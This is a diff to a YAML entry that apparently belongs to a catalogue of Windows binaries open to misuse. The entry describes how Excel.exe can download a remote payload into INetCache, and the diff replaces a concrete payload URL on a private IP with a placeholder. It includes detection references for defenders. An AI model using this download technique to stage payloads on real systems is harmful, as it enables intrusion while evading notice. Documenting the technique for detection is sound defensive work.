@@ -4,7 +4,7 @@ Description: Microsoft Office binary
 Author: 'Reegun J (OCBC Bank)'
 Created: 2019-07-19
 Commands:
-  - Command: Excel.exe http://192.168.1.10/TeamsAddinLoader.dll
+  - Command: Excel.exe {REMOTEURL}
     Description: Downloads payload from remote server
     Usecase: It will download a remote payload and place it in INetCache.
     Category: Download
@@ -29,8 +29,6 @@ Full_Path:
   - Path: C:\Program Files (x86)\Microsoft Office\Office12\Excel.exe
   - Path: C:\Program Files\Microsoft Office\Office12\Excel.exe
   - Path: C:\Program Files\Microsoft Office\Office12\Excel.exe
-Code_Sample:
-  - Code:
 Detection:
   - Sigma: https://github.com/SigmaHQ/sigma/blob/c04bef2fbbe8beff6c7620d5d7ea6872dbe7acba/rules/windows/process_creation/proc_creation_win_lolbin_office.yml
   - IOC: Suspicious Office application Internet/network traffic
